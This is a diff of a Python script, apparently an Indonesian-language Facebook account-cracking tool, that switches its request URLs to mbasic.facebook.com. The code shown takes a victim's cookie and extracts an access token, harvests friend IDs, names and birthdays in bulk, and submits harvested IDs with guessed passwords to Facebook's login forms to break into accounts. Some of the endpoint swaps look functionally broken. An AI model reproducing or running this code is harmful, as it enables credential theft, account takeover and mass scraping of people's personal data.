@@ -194,12 +194,12 @@ def login():
 	cok = input(f'{k}Masukkan cookie :{h} ')
 	try:
 		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
-		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
+		link = ses.get("https://mbasic.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
 		find = re.findall('act=(.*?)&nav_source', link.text)
 		if len(find) == 0:print(f'> {m}cookie kamu invalid / ganti cookie lain !!!');time.sleep(2);exit()
 		else:
 			for x in find:
-				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
+				xz = ses.get(f"https://mbasic.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
 				took = re.search('(EAAB\w+)',xz.text).group(1)
 				open('.tok.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
 				exit(f"Token : {took} \ncookies aktif")
@@ -215,7 +215,7 @@ def menu():
 		time.sleep(4)
 		login()
 	try:
-		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
+		info_datafb = ses.get(f"https://mbasic.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
 		nama = info_datafb["name"]
 		uidfb = info_datafb["id"]
 	except requests.exceptions.ConnectionError:
@@ -281,7 +281,7 @@ def dump_massal():
 	           'fields': "friends"
 	           }	           
 	       )
-	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
+	       url = requests.get('https://mbasic.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
 	       for xr in url['friends']['data']:
 	           try:
 	               woy = (xr['id']+'|'+xr['name'])
@@ -325,7 +325,7 @@ def dump(idt,fields,cookie,token):
 				"access_token": token,
 				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
 			}
-		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
+		url = ses.get(f"https://mbasic.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
 		for i in url["friends"]["data"]:
 			#print(i["id"]+"|"+i["name"])
 			id.append(i["id"]+"|"+i["name"])
@@ -550,7 +550,7 @@ def crackvalidate(idf,pwx,url):
 		try:
 			ua = random.choice(ugen)
 			#ua2 = ("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59")
-			link = ses.get("https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=774161767670269&kid_directed_site=0&app_id=774161767670269&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D774161767670269%26cbt%3D1703831090514%26e2e%3D%257B%2522init%2522%253A1703831090514%257D%26ies%3D1%26sdk%3Dandroid-15.2.0%26sso%3Dchrome_custom_tab%26nonce%3De76fb0b6-1091-4e34-9773-8df99ad0c4fb%26scope%3Duser_birthday%252Copenid%252Cpublic_profile%252Cuser_gender%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522c1863f90-9292-4353-8f6d-c3b90c5d3e01%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522o74mjflp5skk6snj6qsu%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.fiya.android%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DCO2uf2MBh5SJJEe_ohDLk8bPflwbmKX12fxf8mW8ks0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc1863f90-9292-4353-8f6d-c3b90c5d3e01%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.fiya.android%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522c1863f90-9292-4353-8f6d-c3b90c5d3e01%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522o74mjflp5skk6snj6qsu%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
+			link = ses.get("https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=774161767670269&kid_directed_site=0&app_id=774161767670269&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D774161767670269%26cbt%3D1703831090514%26e2e%3D%257B%2522init%2522%253A1703831090514%257D%26ies%3D1%26sdk%3Dandroid-15.2.0%26sso%3Dchrome_custom_tab%26nonce%3De76fb0b6-1091-4e34-9773-8df99ad0c4fb%26scope%3Duser_birthday%252Copenid%252Cpublic_profile%252Cuser_gender%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522c1863f90-9292-4353-8f6d-c3b90c5d3e01%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522o74mjflp5skk6snj6qsu%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.fiya.android%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DCO2uf2MBh5SJJEe_ohDLk8bPflwbmKX12fxf8mW8ks0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc1863f90-9292-4353-8f6d-c3b90c5d3e01%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.fiya.android%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522c1863f90-9292-4353-8f6d-c3b90c5d3e01%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522o74mjflp5skk6snj6qsu%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
 			date = (
 			{
 			"lsd":
@@ -558,7 +558,7 @@ def crackvalidate(idf,pwx,url):
 			"jazoest":
 			      re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
 	        "uid":idf,
-	        "next": "https://x.facebook.com/v3.1/dialog/oauth?client_id=3213804762189845&redirect_uri=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success&scope=email&state=0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%253D&ret=login&fbapp_pres=0&logger_id=af919600-a681-4aeb-a128-05e90339859f&tp=unspecified",
+	        "next": "https://mbasic.facebook.com/v3.1/dialog/oauth?client_id=3213804762189845&redirect_uri=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success&scope=email&state=0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%253D&ret=login&fbapp_pres=0&logger_id=af919600-a681-4aeb-a128-05e90339859f&tp=unspecified",
 	        "flow":"login_no_pin",
 	        "pass":pw,
 	        } 
@@ -657,7 +657,7 @@ def crackreguler(idf,pwx,url):
 			"accept-language":"en-US;q=0.8,en;q=0.7"
 			}
 		)
-			link = ses.get('https://m.facebook.com/login/?email='+idf).text
+			link = ses.get('https://mbasic.facebook.com/login/?email='+idf).text
 			date = ({'lsd':re.search('name="lsd" value="(.*?)"', str(link)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(link)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
 'li':re.search('name="li" value="(.*?)"', str(link)).group(1),'email':idf,'pass':pw})
 			ses.headers.update(
